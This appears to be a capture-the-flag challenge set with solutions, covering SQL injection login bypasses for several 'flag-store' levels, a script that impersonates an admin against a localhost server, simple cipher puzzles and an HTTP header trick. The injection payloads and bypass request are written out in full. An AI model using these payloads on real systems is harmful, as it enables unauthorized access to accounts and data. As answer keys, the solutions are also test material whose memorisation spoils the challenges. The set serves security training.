Only ME the admin gets to put up new posters.

import sys

import requests

URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"

r = requests.post(f"{URL}/newPoster", json={"user": "admin", "poster": "anything"})

name: flag-store-2
description:
I love flags! So much so, that I decided to make a store to sell them. I saw that the user Cyber ordered a really cool flag...

{{ link }}
solution: The query is built with an f-string. Single quotes are blocked in the username but not the password, so log in with any username and the password `' OR username = 'Cyber' -- ` to become Cyber and see their order.

name: flag-store-3
description:
I love flags! So much so, that I decided to make a store to sell them. I saw that the user Cyber ordered a really cool flag...

{{ link }}

solve_files.solve.txt:
Username: \
Password:  OR 1=1 OFFSET 1 ROWS; -- 

Note: password has a space before or and a space after --

This results in below query:
SELECT * FROM user WHERE username = '\' AND password = ' OR 1=1 OFFSET 1 ROWS; -- '

solution: Quotes are blocked in both fields, but the query uses Postgres `E''` escape strings, where a backslash escapes the next character. A username of `\` swallows the closing quote, so the password field becomes raw SQL: ` OR 1=1 OFFSET 1 ROWS; -- ` picks the second user, Cyber.

name: flag-store-5
description:
I love flags! So much so, that I decided to make a store to sell them. I saw that the user Cyber ordered a really cool flag...

{{ link }}

solve_files.solve.txt:
Username: Cyber
Password: ' OR username LIKE 'C%'; -- -

solution: Both fields are upper-cased before the query, so `'Cyber'` turns into `'CYBER'` and an `=` comparison misses. SQLite's `LIKE` is case-insensitive, so the password `' OR username LIKE 'C%'; -- -` still lands on Cyber.

name: salad
description: You're cooking a delisous dinner for your pet anchovy, but you're wondering what greens you should feed him. He left you a note, but you're unsure how to read it...
solution: Caesar salad, so a Caesar cipher: the note is shifted by 12 (`oknqd` → `cyber`). Shift every letter back by 12.

name: cryptoduels
description: You are so close to beating your friend in crypto duels. You just have to decipher this last quote!! Check the hint if you need to.
solution: The hint says the first word is "Nobody", and `Mlylwb` → `Nobody` is a mirror substitution: the Atbash cipher (a↔z, b↔y, ...). Decode the last line to get the flag.

name: get-ahead
description:

{{ link }}

solve_files.solve.txt:
curl --head http://0.0.0.0:8080/flag1
curl http://0.0.0.0:8080 -H 'user-agent: ocean explorer'

solution: Two halves. `HEAD /flag1` returns the first half in a `FLAG` header ("get a HEAD"). `GET /` with the User-Agent `ocean explorer` returns the second half (Patrick needs a head from the ocean).
